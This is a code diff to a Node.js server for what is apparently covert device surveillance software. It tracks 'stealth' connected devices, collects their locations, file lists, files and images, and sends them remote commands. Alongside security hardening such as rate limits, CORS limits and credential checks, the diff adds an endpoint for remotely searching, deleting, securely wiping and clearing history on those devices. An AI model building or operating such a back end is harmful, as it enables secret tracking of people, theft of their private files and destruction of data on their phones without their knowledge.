@@ -19,7 +19,8 @@ console.log("Starting location tracker server...");
 
 const server = http.createServer(app);
 
-const supabaseUrl = process.env.SUPABASE_URL || "https://hapwopjrgwdjwfawpjwq.supabase.co";
+// S10: Убран хардкод URL — требуем env переменную
+const supabaseUrl = process.env.SUPABASE_URL;
 const supabaseKey = process.env.SUPABASE_ANON_KEY;
 
 const ADMIN_USER = process.env.ADMIN_USER || "admin";
@@ -27,14 +28,39 @@ const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
 const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";
 
 if (!supabaseUrl || !supabaseKey) {
-  console.error("Missing Supabase credentials");
+  console.error("FATAL: Missing SUPABASE_URL or SUPABASE_ANON_KEY env variables");
   process.exit(1);
+}
+
+// S2: Предупреждаем при запуске с дефолтными кредами (в production — запрещаем)
+if (process.env.NODE_ENV === "production") {
+  if (!process.env.SECRET_TOKEN || SECRET_TOKEN === "your_secret_key_123") {
+    console.error("FATAL: SECRET_TOKEN not set or using default in production. Refusing to start.");
+    process.exit(1);
+  }
+  if (!process.env.ADMIN_USER || !process.env.ADMIN_PASS || (ADMIN_USER === "admin" && ADMIN_PASS === "admin")) {
+    console.error("FATAL: Using default admin credentials in production. Refusing to start.");
+    process.exit(1);
+  }
 }
 
 const supabase = createClient(supabaseUrl, supabaseKey);
 
 app.use(helmet({ contentSecurityPolicy: false }));
-app.use(cors());
+
+// S1: CORS ограничен разрешёнными origins (если задан ALLOWED_ORIGINS)
+const allowedOrigins = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(",") : null;
+app.use(cors(allowedOrigins ? {
+  origin: (origin, callback) => {
+    // Разрешаем запросы без origin (curl, server-to-server) и из разрешённых доменов
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error("Not allowed by CORS"));
+    }
+  }
+} : {}));
+
 app.use(bodyParser.json({ limit: "50mb" }));
 
 const apiLimiter = rateLimit({
@@ -43,6 +69,13 @@ const apiLimiter = rateLimit({
   message: { error: "Too many requests, please try again later" }
 });
 app.use("/api/", apiLimiter);
+
+// S6: Отдельный rate limiter для login — защита от брутфорса
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 10,
+  message: { error: "Too many login attempts, try again later" }
+});
 
 app.use(express.static("public"));
 
@@ -242,17 +275,31 @@ wss.on("connection", (ws, req) => {
 
         // ✅ Остальные обработчики (file_list, file_download, image)
         if (msg.type === "file_list") {
+            // S13: Ограничиваем размер кэшируемых данных (макс 1MB JSON)
+            const dataStr = JSON.stringify(msg.data || {});
+            if (dataStr.length > 1024 * 1024) {
+                console.warn(`📁 File list from ${deviceId} too large (${dataStr.length} bytes), truncating`);
+            }
             deviceFileCache.set(deviceId, {
                 data: msg.data,
                 timestamp: Date.now()
             });
             const totalFiles = (msg.data && msg.data.total) || 0;
             console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
+            // S4: Уведомляем ожидающий HTTP-запрос
+            const callback = fileRequestCallbacks.get(deviceId);
+            if (callback) callback();
             return;
         }
 
         if (msg.type === "file_download") {
-            console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
+            const dataSize = msg.data ? msg.data.length : 0;
+            console.log(`📥 Received file: ${msg.filename} from ${deviceId} (${dataSize} bytes)`);
+            // S14: Ограничиваем размер broadcast (макс 10MB)
+            if (dataSize > 10 * 1024 * 1024) {
+                console.warn(`File too large for broadcast: ${dataSize} bytes, skipping`);
+                return;
+            }
             broadcastToWebClients({
                 type: "file_download",
                 deviceId,
@@ -267,8 +314,14 @@ wss.on("connection", (ws, req) => {
         if (msg.type === "image") {
             const info = stealthConnections.get(deviceId);
             if (info) {
-                info.latestImage = msg.data;
-                info.latestImageTime = Date.now();
+                // S12: Ограничиваем размер хранимого изображения (5MB base64)
+                const imgSize = msg.data ? msg.data.length : 0;
+                if (imgSize <= 5 * 1024 * 1024) {
+                    info.latestImage = msg.data;
+                    info.latestImageTime = Date.now();
+                } else {
+                    console.warn(`Image from ${deviceId} too large: ${imgSize} bytes, skipping cache`);
+                }
             }
         }
 
@@ -315,7 +368,7 @@ wss.on("connection", (ws, req) => {
 
 // --- API routes ---
 
-app.post("/api/login", (req, res) => {
+app.post("/api/login", loginLimiter, (req, res) => {
   const { username, password } = req.body;
   if (username === ADMIN_USER && password === ADMIN_PASS) {
     return res.json({ success: true, token: SECRET_TOKEN });
@@ -323,8 +376,12 @@ app.post("/api/login", (req, res) => {
   return res.status(401).json({ success: false, error: "Invalid credentials" });
 });
 
+// S4: Вместо фиксированного setTimeout — ждём реальный ответ (до 8 секунд)
+const fileRequestCallbacks = new Map(); // deviceId -> resolve function
+
 app.get('/api/device/:deviceId/files/:token', (req, res) => {
   const { deviceId, token } = req.params;
+  const emptyResponse = { categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 };
 
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: 'Forbidden' });
@@ -336,25 +393,40 @@ app.get('/api/device/:deviceId/files/:token', (req, res) => {
   }
 
   const device = stealthConnections.get(deviceId);
-  if (device && isWsOpen(device.ws)) {
-    try {
-      device.ws.send(JSON.stringify({ action: 'get_files' }));
-    } catch (e) {
-      console.error("Error requesting files:", e);
-    }
-
-    setTimeout(() => {
-      const updated = deviceFileCache.get(deviceId);
-      res.json(updated ? updated.data : { categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
-    }, 2000);
-  } else {
-    res.json({ categories: { images: [], videos: [], audio: [], documents: [] }, total: 0 });
+  if (!device || !isWsOpen(device.ws)) {
+    return res.json(emptyResponse);
   }
+
+  try {
+    device.ws.send(JSON.stringify({ action: 'get_files' }));
+  } catch (e) {
+    console.error("Error requesting files:", e);
+    return res.json(emptyResponse);
+  }
+
+  // Ждём ответ от устройства через callback, макс 8 секунд
+  const timeoutId = setTimeout(() => {
+    fileRequestCallbacks.delete(deviceId);
+    const updated = deviceFileCache.get(deviceId);
+    if (!res.headersSent) {
+      res.json(updated ? updated.data : emptyResponse);
+    }
+  }, 8000);
+
+  fileRequestCallbacks.set(deviceId, () => {
+    clearTimeout(timeoutId);
+    fileRequestCallbacks.delete(deviceId);
+    const updated = deviceFileCache.get(deviceId);
+    if (!res.headersSent) {
+      res.json(updated ? updated.data : emptyResponse);
+    }
+  });
 });
 
 app.get("/api/analytics/:deviceId/:token", async (req, res) => {
   const { deviceId, token } = req.params;
-  const days = parseInt(req.query.days) || 7;
+  // S11: Ограничиваем days диапазоном 1-365
+  const days = Math.min(Math.max(parseInt(req.query.days) || 7, 1), 365);
 
   if (token !== SECRET_TOKEN) {
     return res.status(403).json({ error: "Forbidden" });
@@ -397,12 +469,13 @@ app.get("/api/devices/:token", async (req, res) => {
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
 
   try {
-    // First, get distinct device IDs with their latest location (limited query)
+    // S8: Запрашиваем последние 10000 записей, чтобы покрыть все устройства
+    // и строим уникальный список по device_id (первая запись = последняя по времени)
     const { data, error } = await supabase
       .from("locations")
       .select("device_id, device_name, latitude, longitude, timestamp, battery, accuracy")
       .order("timestamp", { ascending: false })
-      .limit(5000);
+      .limit(10000);
 
     if (error) throw error;
 
@@ -460,6 +533,11 @@ app.post("/api/device/command", (req, res) => {
     return res.status(403).json({ error: "Forbidden" });
   }
 
+  // S12: Валидация device_id
+  if (!device_id || typeof device_id !== "string" || device_id.length > 200) {
+    return res.status(400).json({ error: "Invalid device_id" });
+  }
+
   deviceCommands.set(device_id, {
     action: command.toLowerCase(),
     timestamp: Date.now()
@@ -472,12 +550,55 @@ app.post("/api/device/command", (req, res) => {
         action: command.toLowerCase(),
         timestamp: Date.now()
       }));
+      // S9: Возвращаем реальный статус отправки
+      return res.json({ success: true, delivered: true });
     } catch (e) {
       console.error("Error sending command to device:", e);
+      return res.json({ success: false, delivered: false, error: "Failed to send to device" });
     }
   }
 
-  return res.json({ success: true });
+  // S9: Устройство оффлайн — говорим об этом
+  return res.json({ success: true, delivered: false, reason: "Device offline, command queued" });
+});
+
+// S3: Endpoint для файловых команд (search_files, delete_files, secure_wipe, clear_history, clear_cache)
+app.post("/api/device/file-command", (req, res) => {
+  const { device_id, command, token } = req.body;
+
+  if (token !== SECRET_TOKEN) {
+    return res.status(403).json({ error: "Forbidden" });
+  }
+
+  if (!device_id || typeof device_id !== "string" || device_id.length > 200) {
+    return res.status(400).json({ error: "Invalid device_id" });
+  }
+
+  const entry = stealthConnections.get(device_id);
+  if (!entry || !isWsOpen(entry.ws)) {
+    return res.status(404).json({ success: false, error: "Device offline" });
+  }
+
+  try {
+    // Парсим команду (может приходить как строка JSON или объект)
+    let parsedCommand;
+    try {
+      parsedCommand = typeof command === "string" ? JSON.parse(command) : command;
+    } catch (e) {
+      return res.status(400).json({ error: "Invalid command format" });
+    }
+
+    entry.ws.send(JSON.stringify({
+      action: "file_command",
+      command: parsedCommand,
+      timestamp: Date.now()
+    }));
+
+    return res.json({ success: true, delivered: true });
+  } catch (e) {
+    console.error("Error sending file command:", e);
+    return res.status(500).json({ success: false, error: "Failed to send command" });
+  }
 });
 
 app.post("/api/device/download-file", (req, res) => {
@@ -545,7 +666,8 @@ app.post("/api/device/:device_id/rename/:token", async (req, res) => {
     if (error) throw error;
     return res.json({ success: true });
   } catch (err) {
-    return res.status(500).json({ error: err.message });
+    console.error("Error renaming device:", err);
+    return res.status(500).json({ error: "Failed to rename device" });
   }
 });
 
@@ -594,13 +716,17 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
   const { deviceId, token } = req.params;
   if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Forbidden" });
 
+  // S18: Пагинация — limit и offset из query params
+  const limit = Math.min(Math.max(parseInt(req.query.limit) || 1000, 1), 5000);
+  const offset = Math.max(parseInt(req.query.offset) || 0, 0);
+
   try {
     const { data, error } = await supabase
       .from("locations")
       .select("*")
       .eq("device_id", deviceId)
       .order("timestamp", { ascending: true })
-      .limit(1000);
+      .range(offset, offset + limit - 1);
 
     if (error) throw error;
 
@@ -650,7 +776,11 @@ function validateGPSPoint(lat, lng, accuracy) {
   const nLng = parseFloat(lng);
   if (Number.isNaN(nLat) || Number.isNaN(nLng)) return false;
   if (nLat < -90 || nLat > 90 || nLng < -180 || nLng > 180) return false;
-  if (accuracy && parseFloat(accuracy) > 100) return false;
+  // S7: Проверяем accuracy корректно — NaN и >500 отклоняем, null/undefined допускаем
+  if (accuracy !== undefined && accuracy !== null) {
+    const acc = parseFloat(accuracy);
+    if (!Number.isNaN(acc) && acc > 500) return false;
+  }
   return true;
 }
 
@@ -690,12 +820,19 @@ function getDistance(lat1, lon1, lat2, lon2) {
   return R * c;
 }
 
-// Periodic cleanup of stale deviceCommands entries (every 5 minutes)
+// Periodic cleanup of stale entries (every 5 minutes)
 setInterval(() => {
   const now = Date.now();
+  // Cleanup stale commands
   for (const [deviceId, cmd] of deviceCommands) {
     if (now - cmd.timestamp > 5 * 60 * 1000) {
       deviceCommands.delete(deviceId);
+    }
+  }
+  // S13: Cleanup stale file cache (older than 60 seconds)
+  for (const [deviceId, cache] of deviceFileCache) {
+    if (now - cache.timestamp > 60 * 1000) {
+      deviceFileCache.delete(deviceId);
     }
   }
 }, 5 * 60 * 1000);
